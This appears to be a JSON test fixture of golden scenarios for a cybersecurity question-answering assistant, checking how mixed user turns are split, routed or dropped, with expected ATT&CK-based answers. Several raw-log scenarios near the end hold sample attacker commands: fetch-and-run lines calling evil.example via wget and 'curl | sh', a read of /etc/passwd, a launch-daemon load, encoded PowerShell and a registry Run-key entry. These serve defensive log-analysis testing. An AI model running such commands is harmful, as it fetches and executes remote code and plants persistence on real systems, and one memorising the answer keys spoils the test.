@@ -1,0 +1,726 @@
+{
+  "schema_version": "1.1",
+  "purpose": "Multi-intent orchestration golden scenarios: split/route/drop correctness plus per-segment answer ground truth sourced from final_golden_set.json.",
+  "source_golden_artifact": "final_golden_set.json",
+  "source_golden_artifact_sha256": "8b883ecf29f6488adc946d36669290945379d6cf2cad4c8b35c50df422d05cd2",
+  "scenario_count": 24,
+  "scenarios": [
+    {
+      "id": "single-real-question",
+      "category": "single_real_question",
+      "description": "One real question, no noise -> single path, no cards.",
+      "input": "What mitigates T1001 (Data Obfuscation)?",
+      "raw_log": false,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 1,
+      "expected_golden_ids": [
+        "enterprise-mitigations-t1001::original"
+      ],
+      "segments": [
+        {
+          "text": "What mitigates T1001 (Data Obfuscation)?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-mitigations-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) is mitigated by M1031 (Network Intrusion Prevention)."
+        }
+      ]
+    },
+    {
+      "id": "single-alias-also-known-as",
+      "category": "alias_single_intent",
+      "description": "The exact 'also known as' 156-case: one intent, must NOT split.",
+      "input": "Which campaigns employ the use of Tool S0002, also known as Mimikatz?",
+      "raw_log": false,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 1,
+      "expected_golden_ids": [
+        "software-used-by-campaigns-s0002::reworded"
+      ],
+      "segments": [
+        {
+          "text": "Which campaigns employ the use of Tool S0002, also known as Mimikatz?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "software-used-by-campaigns-s0002::reworded",
+          "expected_answer": "Tool S0002 (Mimikatz) is directly used by C0014 (Operation Wocao), C0017 (C0017), C0018 (C0018), C0024 (SolarWinds Compromise), C0030 (Triton Safety Instrumented System Attack), C0032 (C0032), C0038 (HomeLand Justice), C0058 (SharePoint ToolShell Exploitation), and C0061 (Operation Digital Eye) in the pinned Enterprise ATT&CK snapshot."
+        }
+      ],
+      "note": "Regression guard for the additive-adverb clause-starter fix."
+    },
+    {
+      "id": "single-compound-and",
+      "category": "compound_entity_and",
+      "description": "Bare 'and' joins compound entities -> one intent, no split.",
+      "input": "Compare APT29 and Lazarus Group techniques?",
+      "raw_log": false,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 1,
+      "expected_golden_ids": [],
+      "segments": [
+        {
+          "text": "Compare APT29 and Lazarus Group techniques?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": null,
+          "expected_answer": null
+        }
+      ]
+    },
+    {
+      "id": "multi-two-questions",
+      "category": "two_questions",
+      "description": "Two distinct cybersecurity questions -> two cards.",
+      "input": "What mitigates T1001 (Data Obfuscation)? Which tactics does T1001 (Data Obfuscation) belong to?",
+      "raw_log": false,
+      "expects_cards": true,
+      "single_fallback": false,
+      "expected_routed_count": 2,
+      "expected_golden_ids": [
+        "enterprise-mitigations-t1001::original",
+        "enterprise-tactics-t1001::original"
+      ],
+      "segments": [
+        {
+          "text": "What mitigates T1001 (Data Obfuscation)?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-mitigations-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) is mitigated by M1031 (Network Intrusion Prevention)."
+        },
+        {
+          "text": "Which tactics does T1001 (Data Obfuscation) belong to?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-tactics-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) belongs to the TA0011 (Command and Control) tactic."
+        }
+      ]
+    },
+    {
+      "id": "multi-three-questions",
+      "category": "three_questions",
+      "description": "Three distinct cybersecurity questions -> three cards.",
+      "input": "What mitigates T1001 (Data Obfuscation)? What techniques does Axiom use? Which group is attributed to C0022 (Operation Dream Job)?",
+      "raw_log": false,
+      "expects_cards": true,
+      "single_fallback": false,
+      "expected_routed_count": 3,
+      "expected_golden_ids": [
+        "enterprise-mitigations-t1001::original",
+        "group-uses-techniques-g0001::original",
+        "campaign-attributed-groups-c0022::original"
+      ],
+      "segments": [
+        {
+          "text": "What mitigates T1001 (Data Obfuscation)?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-mitigations-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) is mitigated by M1031 (Network Intrusion Prevention)."
+        },
+        {
+          "text": "What techniques does Axiom use?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "group-uses-techniques-g0001::original",
+          "expected_answer": "G0001 (Axiom) uses T1001.002 (Steganography), T1003 (OS Credential Dumping), T1005 (Data from Local System), T1021.001 (Remote Desktop Protocol), T1078 (Valid Accounts), T1189 (Drive-by Compromise), T1190 (Exploit Public-Facing Application), T1203 (Exploitation for Client Execution), T1546.008 (Accessibility Features), T1553 (Subvert Trust Controls), T1560 (Archive Collected Data), T1563.002 (RDP Hijacking), T1566 (Phishing), T1583.002 (DNS Server), T1583.003 (Virtual Private Server), and T1584.005 (Botnet) in the pinned Enterprise ATT&CK snapshot under the direct-plus-campaign scope."
+        },
+        {
+          "text": "Which group is attributed to C0022 (Operation Dream Job)?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "campaign-attributed-groups-c0022::original",
+          "expected_answer": "C0022 (Operation Dream Job) is attributed to G0032 (Lazarus Group) in the pinned Enterprise ATT&CK snapshot."
+        }
+      ]
+    },
+    {
+      "id": "multi-typo-plus-normal",
+      "category": "typo_plus_normal",
+      "description": "A typo'd question + a normal one; both route, both map to golden.",
+      "input": "What mitigates T1001 (Data Obfusaction)? Which tactics does T1001 (Data Obfuscation) belong to?",
+      "raw_log": false,
+      "expects_cards": true,
+      "single_fallback": false,
+      "expected_routed_count": 2,
+      "expected_golden_ids": [
+        "enterprise-mitigations-t1001::typo",
+        "enterprise-tactics-t1001::original"
+      ],
+      "segments": [
+        {
+          "text": "What mitigates T1001 (Data Obfusaction)?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-mitigations-t1001::typo",
+          "expected_answer": "T1001 (Data Obfuscation) is mitigated by M1031 (Network Intrusion Prevention)."
+        },
+        {
+          "text": "Which tactics does T1001 (Data Obfuscation) belong to?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-tactics-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) belongs to the TA0011 (Command and Control) tactic."
+        }
+      ]
+    },
+    {
+      "id": "multi-chitchat-then-question",
+      "category": "chitchat_plus_question",
+      "description": "Greeting then one real question; greeting dropped, 1 routed.",
+      "input": "hi how are you? Which tactics does T1001 (Data Obfuscation) belong to?",
+      "raw_log": false,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 1,
+      "expected_golden_ids": [
+        "enterprise-tactics-t1001::original"
+      ],
+      "segments": [
+        {
+          "text": "hi how are you?",
+          "disposition": "drop",
+          "reason": "chitchat",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "Which tactics does T1001 (Data Obfuscation) belong to?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-tactics-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) belongs to the TA0011 (Command and Control) tactic."
+        }
+      ]
+    },
+    {
+      "id": "multi-gibberish-then-question",
+      "category": "gibberish_plus_question",
+      "description": "Keyboard smash then one real question; gibberish dropped, 1 routed.",
+      "input": "asdfghjkl qwrtplkjhg. What techniques does Trojan.Mebromi use?",
+      "raw_log": false,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 1,
+      "expected_golden_ids": [
+        "software-uses-techniques-s0001::original"
+      ],
+      "segments": [
+        {
+          "text": "asdfghjkl qwrtplkjhg.",
+          "disposition": "drop",
+          "reason": "gibberish",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "What techniques does Trojan.Mebromi use?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "software-uses-techniques-s0001::original",
+          "expected_answer": "S0001 (Trojan.Mebromi) directly uses T1542.001 (System Firmware) in the pinned Enterprise ATT&CK snapshot."
+        }
+      ]
+    },
+    {
+      "id": "multi-question-then-gibberish",
+      "category": "question_plus_gibberish",
+      "description": "One real question then trailing gibberish; gibberish dropped, 1 routed.",
+      "input": "What techniques does Axiom use? asdfghjkl qwrtplkjhg.",
+      "raw_log": false,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 1,
+      "expected_golden_ids": [
+        "group-uses-techniques-g0001::original"
+      ],
+      "segments": [
+        {
+          "text": "What techniques does Axiom use?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "group-uses-techniques-g0001::original",
+          "expected_answer": "G0001 (Axiom) uses T1001.002 (Steganography), T1003 (OS Credential Dumping), T1005 (Data from Local System), T1021.001 (Remote Desktop Protocol), T1078 (Valid Accounts), T1189 (Drive-by Compromise), T1190 (Exploit Public-Facing Application), T1203 (Exploitation for Client Execution), T1546.008 (Accessibility Features), T1553 (Subvert Trust Controls), T1560 (Archive Collected Data), T1563.002 (RDP Hijacking), T1566 (Phishing), T1583.002 (DNS Server), T1583.003 (Virtual Private Server), and T1584.005 (Botnet) in the pinned Enterprise ATT&CK snapshot under the direct-plus-campaign scope."
+        },
+        {
+          "text": "asdfghjkl qwrtplkjhg.",
+          "disposition": "drop",
+          "reason": "gibberish",
+          "golden_id": null,
+          "expected_answer": null
+        }
+      ]
+    },
+    {
+      "id": "multi-long-gibberish-plus-question",
+      "category": "long_gibberish_plus_question",
+      "description": "Long keyboard-smash content plus one real question; gibberish dropped.",
+      "input": "asdfghjkl qwrtplkjhg zxcvbnmqwe lkjhgfdsapoi mnbvcxzlkjhg poiuytrewqzx. What mitigates T1001 (Data Obfuscation)?",
+      "raw_log": false,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 1,
+      "expected_golden_ids": [
+        "enterprise-mitigations-t1001::original"
+      ],
+      "segments": [
+        {
+          "text": "asdfghjkl qwrtplkjhg zxcvbnmqwe lkjhgfdsapoi mnbvcxzlkjhg poiuytrewqzx.",
+          "disposition": "drop",
+          "reason": "gibberish",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "What mitigates T1001 (Data Obfuscation)?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-mitigations-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) is mitigated by M1031 (Network Intrusion Prevention)."
+        }
+      ]
+    },
+    {
+      "id": "multi-noise-two-questions",
+      "category": "chitchat_gibberish_two_questions",
+      "description": "Greeting + gibberish wrapped around two real questions -> two cards.",
+      "input": "hi how are you? What mitigates T1001 (Data Obfuscation)? asdfghjkl qwrtplkjhg zxcvbnmqwe lkjhgfdsapoi mnbvcxzlkjhg poiuytrewqzx. How is T1001 (Data Obfuscation) detected?",
+      "raw_log": false,
+      "expects_cards": true,
+      "single_fallback": false,
+      "expected_routed_count": 2,
+      "expected_golden_ids": [
+        "enterprise-mitigations-t1001::original",
+        "technique-detection-strategy-t1001::original"
+      ],
+      "segments": [
+        {
+          "text": "hi how are you?",
+          "disposition": "drop",
+          "reason": "chitchat",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "What mitigates T1001 (Data Obfuscation)?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-mitigations-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) is mitigated by M1031 (Network Intrusion Prevention)."
+        },
+        {
+          "text": "asdfghjkl qwrtplkjhg zxcvbnmqwe lkjhgfdsapoi mnbvcxzlkjhg poiuytrewqzx.",
+          "disposition": "drop",
+          "reason": "gibberish",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "How is T1001 (Data Obfuscation) detected?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "technique-detection-strategy-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) is detected by DET0053 (Detect Obfuscated C2 via Network Traffic Analysis). Its active analytics are AN0144 (Analytic 0144), AN0145 (Analytic 0145), and AN0146 (Analytic 0146)."
+        }
+      ]
+    },
+    {
+      "id": "multi-offtopic-plus-question",
+      "category": "offtopic_plus_question",
+      "description": "Off-topic question + a real one; both route, off-topic softly refused.",
+      "input": "what is the capital of France? Which group is attributed to C0022 (Operation Dream Job)?",
+      "raw_log": false,
+      "expects_cards": true,
+      "single_fallback": false,
+      "expected_routed_count": 2,
+      "expected_golden_ids": [
+        "campaign-attributed-groups-c0022::original"
+      ],
+      "segments": [
+        {
+          "text": "what is the capital of France?",
+          "disposition": "route",
+          "reason": "offtopic_question",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "Which group is attributed to C0022 (Operation Dream Job)?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "campaign-attributed-groups-c0022::original",
+          "expected_answer": "C0022 (Operation Dream Job) is attributed to G0032 (Lazarus Group) in the pinned Enterprise ATT&CK snapshot."
+        }
+      ]
+    },
+    {
+      "id": "multi-all-offtopic",
+      "category": "all_offtopic",
+      "description": "Two off-topic questions, no real one; both route -> two refusal cards.",
+      "input": "what is the capital of France? who won the world cup in 2018?",
+      "raw_log": false,
+      "expects_cards": true,
+      "single_fallback": false,
+      "expected_routed_count": 2,
+      "expected_golden_ids": [],
+      "segments": [
+        {
+          "text": "what is the capital of France?",
+          "disposition": "route",
+          "reason": "offtopic_question",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "who won the world cup in 2018?",
+          "disposition": "route",
+          "reason": "offtopic_question",
+          "golden_id": null,
+          "expected_answer": null
+        }
+      ]
+    },
+    {
+      "id": "multi-chitchat-offtopic-question",
+      "category": "chitchat_offtopic_question",
+      "description": "Greeting (dropped) + off-topic (routed) + real question (routed).",
+      "input": "good morning! who won the world cup in 2018? What techniques does Trojan.Mebromi use?",
+      "raw_log": false,
+      "expects_cards": true,
+      "single_fallback": false,
+      "expected_routed_count": 2,
+      "expected_golden_ids": [
+        "software-uses-techniques-s0001::original"
+      ],
+      "segments": [
+        {
+          "text": "good morning!",
+          "disposition": "drop",
+          "reason": "chitchat",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "who won the world cup in 2018?",
+          "disposition": "route",
+          "reason": "offtopic_question",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "What techniques does Trojan.Mebromi use?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "software-uses-techniques-s0001::original",
+          "expected_answer": "S0001 (Trojan.Mebromi) directly uses T1542.001 (System Firmware) in the pinned Enterprise ATT&CK snapshot."
+        }
+      ]
+    },
+    {
+      "id": "multi-all-noise",
+      "category": "all_noise",
+      "description": "Only chit-chat and gibberish; nothing routes -> single fallback.",
+      "input": "hi how are you? asdfghjkl qwrtplkjhg. thanks so much for the help.",
+      "raw_log": false,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 0,
+      "expected_golden_ids": [],
+      "segments": [
+        {
+          "text": "hi how are you?",
+          "disposition": "drop",
+          "reason": "chitchat",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "asdfghjkl qwrtplkjhg.",
+          "disposition": "drop",
+          "reason": "gibberish",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "thanks so much for the help.",
+          "disposition": "drop",
+          "reason": "chitchat",
+          "golden_id": null,
+          "expected_answer": null
+        }
+      ]
+    },
+    {
+      "id": "empty-turn",
+      "category": "empty_turn",
+      "description": "Empty/whitespace turn -> nothing to route, single fallback.",
+      "input": "",
+      "raw_log": false,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 0,
+      "expected_golden_ids": [],
+      "segments": []
+    },
+    {
+      "id": "multi-three-questions-plus-noise",
+      "category": "three_questions_plus_noise",
+      "description": "Three real questions with greeting + gibberish interleaved -> three cards.",
+      "input": "hi how are you? Which tactics does T1001 (Data Obfuscation) belong to? What techniques does Axiom use? asdfghjkl qwrtplkjhg. How is T1001 (Data Obfuscation) detected?",
+      "raw_log": false,
+      "expects_cards": true,
+      "single_fallback": false,
+      "expected_routed_count": 3,
+      "expected_golden_ids": [
+        "enterprise-tactics-t1001::original",
+        "group-uses-techniques-g0001::original",
+        "technique-detection-strategy-t1001::original"
+      ],
+      "segments": [
+        {
+          "text": "hi how are you?",
+          "disposition": "drop",
+          "reason": "chitchat",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "Which tactics does T1001 (Data Obfuscation) belong to?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-tactics-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) belongs to the TA0011 (Command and Control) tactic."
+        },
+        {
+          "text": "What techniques does Axiom use?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "group-uses-techniques-g0001::original",
+          "expected_answer": "G0001 (Axiom) uses T1001.002 (Steganography), T1003 (OS Credential Dumping), T1005 (Data from Local System), T1021.001 (Remote Desktop Protocol), T1078 (Valid Accounts), T1189 (Drive-by Compromise), T1190 (Exploit Public-Facing Application), T1203 (Exploitation for Client Execution), T1546.008 (Accessibility Features), T1553 (Subvert Trust Controls), T1560 (Archive Collected Data), T1563.002 (RDP Hijacking), T1566 (Phishing), T1583.002 (DNS Server), T1583.003 (Virtual Private Server), and T1584.005 (Botnet) in the pinned Enterprise ATT&CK snapshot under the direct-plus-campaign scope."
+        },
+        {
+          "text": "asdfghjkl qwrtplkjhg.",
+          "disposition": "drop",
+          "reason": "gibberish",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "How is T1001 (Data Obfuscation) detected?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "technique-detection-strategy-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) is detected by DET0053 (Detect Obfuscated C2 via Network Traffic Analysis). Its active analytics are AN0144 (Analytic 0144), AN0145 (Analytic 0145), and AN0146 (Analytic 0146)."
+        }
+      ]
+    },
+    {
+      "id": "multi-everything",
+      "category": "max_combination",
+      "description": "Greeting + gibberish + off-topic + two real questions in one turn.",
+      "input": "hi how are you? asdfghjkl qwrtplkjhg zxcvbnmqwe lkjhgfdsapoi mnbvcxzlkjhg poiuytrewqzx. what is the capital of France? What mitigates T1001 (Data Obfuscation)? Which group is attributed to C0022 (Operation Dream Job)?",
+      "raw_log": false,
+      "expects_cards": true,
+      "single_fallback": false,
+      "expected_routed_count": 3,
+      "expected_golden_ids": [
+        "enterprise-mitigations-t1001::original",
+        "campaign-attributed-groups-c0022::original"
+      ],
+      "segments": [
+        {
+          "text": "hi how are you?",
+          "disposition": "drop",
+          "reason": "chitchat",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "asdfghjkl qwrtplkjhg zxcvbnmqwe lkjhgfdsapoi mnbvcxzlkjhg poiuytrewqzx.",
+          "disposition": "drop",
+          "reason": "gibberish",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "what is the capital of France?",
+          "disposition": "route",
+          "reason": "offtopic_question",
+          "golden_id": null,
+          "expected_answer": null
+        },
+        {
+          "text": "What mitigates T1001 (Data Obfuscation)?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-mitigations-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) is mitigated by M1031 (Network Intrusion Prevention)."
+        },
+        {
+          "text": "Which group is attributed to C0022 (Operation Dream Job)?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "campaign-attributed-groups-c0022::original",
+          "expected_answer": "C0022 (Operation Dream Job) is attributed to G0032 (Lazarus Group) in the pinned Enterprise ATT&CK snapshot."
+        }
+      ]
+    },
+    {
+      "id": "raw-log-pure",
+      "category": "raw_log",
+      "description": "A raw log paste; must NOT be split - goes to the log-analysis branch.",
+      "input": "timestamp=2024-01-15T10:22:31Z host=WIN-DC01 process=powershell.exe parent=winword.exe cmdline=\"powershell -enc SQBFAFgA\" user=admin\ntimestamp=2024-01-15T10:22:33Z host=WIN-DC01 process=cmd.exe parent=powershell.exe cmdline=\"whoami /priv\" user=admin\ntimestamp=2024-01-15T10:22:35Z host=WIN-DC01 process=net.exe parent=cmd.exe cmdline=\"net group \\\"Domain Admins\\\" /domain\" user=admin",
+      "raw_log": true,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 0,
+      "expected_golden_ids": [],
+      "segments": [
+        {
+          "text": "timestamp=2024-01-15T10:22:31Z host=WIN-DC01 process=powershell.exe parent=winword.exe cmdline=\"powershell -enc SQBFAFgA\" user=admin\ntimestamp=2024-01-15T10:22:33Z host=WIN-DC01 process=cmd.exe parent=powershell.exe cmdline=\"whoami /priv\" user=admin\ntimestamp=2024-01-15T10:22:35Z host=WIN-DC01 process=net.exe parent=cmd.exe cmdline=\"net group \\\"Domain Admins\\\" /domain\" user=admin",
+          "disposition": "log",
+          "reason": "log",
+          "golden_id": null,
+          "expected_answer": null
+        }
+      ]
+    },
+    {
+      "id": "raw-log-windows",
+      "category": "raw_log_platform",
+      "description": "A windows log; must route to the log branch and map to its expected ATT&CK techniques.",
+      "input": "timestamp=2024-01-15T10:22:31Z host=WIN-DC01 process=powershell.exe parent=winword.exe cmdline=\"powershell -enc SQBFAFgA\" user=admin\ntimestamp=2024-01-15T10:22:33Z host=WIN-DC01 process=cmd.exe parent=powershell.exe cmdline=\"whoami /priv\" user=admin\ntimestamp=2024-01-15T10:22:35Z host=WIN-DC01 process=reg.exe parent=cmd.exe cmdline=\"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x\" user=admin",
+      "raw_log": true,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 0,
+      "expected_golden_ids": [],
+      "segments": [
+        {
+          "text": "timestamp=2024-01-15T10:22:31Z host=WIN-DC01 process=powershell.exe parent=winword.exe cmdline=\"powershell -enc SQBFAFgA\" user=admin\ntimestamp=2024-01-15T10:22:33Z host=WIN-DC01 process=cmd.exe parent=powershell.exe cmdline=\"whoami /priv\" user=admin\ntimestamp=2024-01-15T10:22:35Z host=WIN-DC01 process=reg.exe parent=cmd.exe cmdline=\"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x\" user=admin",
+          "disposition": "log",
+          "reason": "log",
+          "golden_id": null,
+          "expected_answer": null
+        }
+      ],
+      "expected_platform": null,
+      "expected_techniques": [
+        "PowerShell",
+        "Registry Run Keys / Startup Folder",
+        "System Owner/User Discovery"
+      ]
+    },
+    {
+      "id": "raw-log-linux",
+      "category": "raw_log_platform",
+      "description": "A linux log; must route to the log branch and map to its expected ATT&CK techniques.",
+      "input": "type=SYSCALL msg=audit(1673778151): comm=\"bash\" exe=\"/bin/bash\" cmdline=\"cat /etc/passwd\" uid=0 auid=1000\ntype=SYSCALL msg=audit(1673778153): comm=\"wget\" exe=\"/usr/bin/wget\" cmdline=\"wget http://evil.example/x.sh -O /tmp/x.sh\" uid=0\ntype=SYSCALL msg=audit(1673778155): comm=\"chmod\" exe=\"/bin/chmod\" cmdline=\"chmod +x /tmp/x.sh\" uid=0\ntype=SYSCALL msg=audit(1673778157): comm=\"crontab\" exe=\"/usr/bin/crontab\" cmdline=\"crontab -e\" uid=0",
+      "raw_log": true,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 0,
+      "expected_golden_ids": [],
+      "segments": [
+        {
+          "text": "type=SYSCALL msg=audit(1673778151): comm=\"bash\" exe=\"/bin/bash\" cmdline=\"cat /etc/passwd\" uid=0 auid=1000\ntype=SYSCALL msg=audit(1673778153): comm=\"wget\" exe=\"/usr/bin/wget\" cmdline=\"wget http://evil.example/x.sh -O /tmp/x.sh\" uid=0\ntype=SYSCALL msg=audit(1673778155): comm=\"chmod\" exe=\"/bin/chmod\" cmdline=\"chmod +x /tmp/x.sh\" uid=0\ntype=SYSCALL msg=audit(1673778157): comm=\"crontab\" exe=\"/usr/bin/crontab\" cmdline=\"crontab -e\" uid=0",
+          "disposition": "log",
+          "reason": "log",
+          "golden_id": null,
+          "expected_answer": null
+        }
+      ],
+      "expected_platform": "linux",
+      "expected_techniques": [
+        "Unix Shell",
+        "Cron",
+        "Ingress Tool Transfer"
+      ]
+    },
+    {
+      "id": "raw-log-macos",
+      "category": "raw_log_platform",
+      "description": "A macos log; must route to the log branch and map to its expected ATT&CK techniques.",
+      "input": "process=osascript cmdline=\"osascript -e do shell script whoami\"\nprocess=launchctl cmdline=\"launchctl load /Library/LaunchDaemons/com.evil.plist\"\nprocess=bash cmdline=\"curl http://evil.example/x | sh\"\nprocess=bash cmdline=\"sudo /usr/bin/defaults write com.apple.loginwindow\"",
+      "raw_log": true,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 0,
+      "expected_golden_ids": [],
+      "segments": [
+        {
+          "text": "process=osascript cmdline=\"osascript -e do shell script whoami\"\nprocess=launchctl cmdline=\"launchctl load /Library/LaunchDaemons/com.evil.plist\"\nprocess=bash cmdline=\"curl http://evil.example/x | sh\"\nprocess=bash cmdline=\"sudo /usr/bin/defaults write com.apple.loginwindow\"",
+          "disposition": "log",
+          "reason": "log",
+          "golden_id": null,
+          "expected_answer": null
+        }
+      ],
+      "expected_platform": "macos",
+      "expected_techniques": [
+        "AppleScript",
+        "Launch Daemon",
+        "Launchctl"
+      ]
+    },
+    {
+      "id": "raw-log-aws",
+      "category": "raw_log_platform",
+      "description": "A aws log; must route to the log branch and map to its expected ATT&CK techniques.",
+      "input": "{\"eventSource\":\"iam.amazonaws.com\",\"eventName\":\"CreateUser\",\"userIdentity\":{\"type\":\"IAMUser\"}}\n{\"eventSource\":\"s3.amazonaws.com\",\"eventName\":\"PutBucketPolicy\"}\n{\"eventSource\":\"signin.amazonaws.com\",\"eventName\":\"ConsoleLogin\",\"responseElements\":{\"ConsoleLogin\":\"Success\"}}\n{\"eventSource\":\"cloudtrail.amazonaws.com\",\"eventName\":\"StopLogging\"}",
+      "raw_log": true,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 0,
+      "expected_golden_ids": [],
+      "segments": [
+        {
+          "text": "{\"eventSource\":\"iam.amazonaws.com\",\"eventName\":\"CreateUser\",\"userIdentity\":{\"type\":\"IAMUser\"}}\n{\"eventSource\":\"s3.amazonaws.com\",\"eventName\":\"PutBucketPolicy\"}\n{\"eventSource\":\"signin.amazonaws.com\",\"eventName\":\"ConsoleLogin\",\"responseElements\":{\"ConsoleLogin\":\"Success\"}}\n{\"eventSource\":\"cloudtrail.amazonaws.com\",\"eventName\":\"StopLogging\"}",
+          "disposition": "log",
+          "reason": "log",
+          "golden_id": null,
+          "expected_answer": null
+        }
+      ],
+      "expected_platform": "aws",
+      "expected_techniques": [
+        "Disable or Modify Cloud Log"
+      ]
+    },
+    {
+      "id": "raw-log-plus-question",
+      "category": "raw_log_plus_question",
+      "description": "A raw log pasted together with a question; the detector flags the whole turn as a log, so it is NOT split - the question is handled by the log branch, not answered as a separate card.",
+      "input": "What mitigates T1001 (Data Obfuscation)?\ntimestamp=2024-01-15T10:22:31Z host=WIN-DC01 process=powershell.exe parent=winword.exe cmdline=\"powershell -enc SQBFAFgA\" user=admin\ntimestamp=2024-01-15T10:22:33Z host=WIN-DC01 process=cmd.exe parent=powershell.exe cmdline=\"whoami /priv\" user=admin\ntimestamp=2024-01-15T10:22:35Z host=WIN-DC01 process=net.exe parent=cmd.exe cmdline=\"net group \\\"Domain Admins\\\" /domain\" user=admin",
+      "raw_log": true,
+      "expects_cards": false,
+      "single_fallback": true,
+      "expected_routed_count": 0,
+      "expected_golden_ids": [],
+      "segments": [
+        {
+          "text": "What mitigates T1001 (Data Obfuscation)?",
+          "disposition": "route",
+          "reason": "cyber_question",
+          "golden_id": "enterprise-mitigations-t1001::original",
+          "expected_answer": "T1001 (Data Obfuscation) is mitigated by M1031 (Network Intrusion Prevention)."
+        },
+        {
+          "text": "timestamp=2024-01-15T10:22:31Z host=WIN-DC01 process=powershell.exe parent=winword.exe cmdline=\"powershell -enc SQBFAFgA\" user=admin\ntimestamp=2024-01-15T10:22:33Z host=WIN-DC01 process=cmd.exe parent=powershell.exe cmdline=\"whoami /priv\" user=admin\ntimestamp=2024-01-15T10:22:35Z host=WIN-DC01 process=net.exe parent=cmd.exe cmdline=\"net group \\\"Domain Admins\\\" /domain\" user=admin",
+          "disposition": "log",
+          "reason": "log",
+          "golden_id": null,
+          "expected_answer": null
+        }
+      ],
+      "swallowed_golden_ids": [
+        "enterprise-mitigations-t1001::original"
+      ],
+      "note": "Documents the log-branch swallow: mixing a question into a log paste routes the entire turn to log analysis."
+    }
+  ]
+}
